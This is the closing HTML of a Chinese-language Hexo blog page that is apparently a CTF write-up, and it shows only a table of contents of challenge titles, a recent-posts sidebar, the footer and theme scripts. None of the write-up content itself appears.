class="toc-text">检索密钥程序</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto-%E6%96%B9%E5%90%91"><span class="toc-number">3.</span> <span class="toc-text">Crypto 方向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cantor%E2%80%99s-gifts"><span class="toc-number">3.1.</span> <span class="toc-text">Cantor’s gifts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8E%E7%8B%90%E7%A6%85"><span class="toc-number">3.2.</span> <span class="toc-text">野狐禅</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sign-in"><span class="toc-number">3.3.</span> <span class="toc-text">Sign in</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.4.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc-%E6%96%B9%E5%90%91"><span class="toc-number">4.</span> <span class="toc-text">Misc 方向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#BadFile"><span class="toc-number">4.1.</span> <span class="toc-text">BadFile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%A2%E6%A3%AE%E5%A0%A1%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">4.2.</span> <span class="toc-text">卢森堡的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meow"><span class="toc-number">4.3.</span> <span class="toc-text">Meow</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AI-%E6%96%B9%E5%90%91"><span class="toc-number">5.</span> <span class="toc-text">AI 方向</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Coup"><span class="toc-number">5.1.</span> <span class="toc-text">Coup</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">6.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret"><span class="toc-number">6.1.</span> <span class="toc-text">ret</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pop"><span class="toc-number">6.2.</span> <span class="toc-text">pop</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/" title="完美解决hexo与vscode无法同时预览图片的路径问题"><img src="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="完美解决hexo与vscode无法同时预览图片的路径问题"/></a><div class="content"><a class="title" href="/2025/12/11/%E8%A7%A3%E5%86%B3hexo%E4%B8%8Evscode%E6%97%A0%E6%B3%95%E5%90%8C%E6%97%B6%E9%A2%84%E8%A7%88%E5%9B%BE%E7%89%87%E7%9A%84%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98/" title="完美解决hexo与vscode无法同时预览图片的路径问题">完美解决hexo与vscode无法同时预览图片的路径问题</a><time datetime="2025-12-11T09:38:52.000Z" title="发表于 2025-12-11 17:38:52">2025-12-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/" title="kali虚拟机不能拖拽文件解决方案"><img src="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/cover.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kali虚拟机不能拖拽文件解决方案"/></a><div class="content"><a class="title" href="/2025/12/03/kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%B8%8D%E8%83%BD%E6%8B%96%E6%8B%BD%E6%96%87%E4%BB%B6%E7%9A%84%E9%97%AE%E9%A2%98/" title="kali虚拟机不能拖拽文件解决方案">kali虚拟机不能拖拽文件解决方案</a><time datetime="2025-12-03T12:59:44.000Z" title="发表于 2025-12-03 20:59:44">2025-12-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/29/MoeCTF-2025-wp/" title="MoeCTF 2025 wp"><img src="/2025/11/29/MoeCTF-2025-wp/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MoeCTF 2025 wp"/></a><div class="content"><a class="title" href="/2025/11/29/MoeCTF-2025-wp/" title="MoeCTF 2025 wp">MoeCTF 2025 wp</a><time datetime="2025-11-28T18:11:37.000Z" title="发表于 2025-11-29 02:11:37">2025-11-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/18/SuperFileSystem/" title="SuperFileSystem"><img src="/2025/11/18/SuperFileSystem/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SuperFileSystem"/></a><div class="content"><a class="title" href="/2025/11/18/SuperFileSystem/" title="SuperFileSystem">SuperFileSystem</a><time datetime="2025-11-18T00:57:18.000Z" title="发表于 2025-11-18 08:57:18">2025-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/17/filesystem/" title="FileSystem"><img src="/2025/11/17/filesystem/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="FileSystem"/></a><div class="content"><a class="title" href="/2025/11/17/filesystem/" title="FileSystem">FileSystem</a><time datetime="2025-11-17T13:08:07.000Z" title="发表于 2025-11-17 21:08:07">2025-11-17</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2025/11/14/TSCTFwp/cover.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By Link</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>